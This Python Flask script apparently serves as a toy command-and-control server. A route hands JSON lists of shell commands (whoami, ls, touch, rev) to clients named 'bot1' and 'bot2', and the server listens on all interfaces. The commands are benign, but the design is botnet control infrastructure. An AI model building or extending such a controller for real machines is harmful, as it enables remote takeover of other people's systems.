from flask import Flask
import json
app = Flask(__name__)

# route() decorator to tell Flask 
#what URL should trigger our function.
@app.route('/')
def index():
    return 'kiddhack3r'

#getcommand/bot1 [list] 
@app.route('/getcommands/<bot>')
def commands(bot):
    #Will print at one line but be taken in as multiple
    if bot == 'bot1':
        lst1 = ["/usr/bin/whoami"]
        #use json.loads on the bot to turn it back into a string
        return json.dumps(lst1)
    if bot == 'bot2':
        lst2 = ['/bin/ls', '/usr/bin/touch children', '/usr/bin/rev']
        return json.dumps(lst2)
    else:
        return 'not a bot'


if __name__ == '__main__':
    print("A")
    #0000 goes to all IPS
    #LocalHost:8080
    app.run(host='0.0.0.0', port=8080)
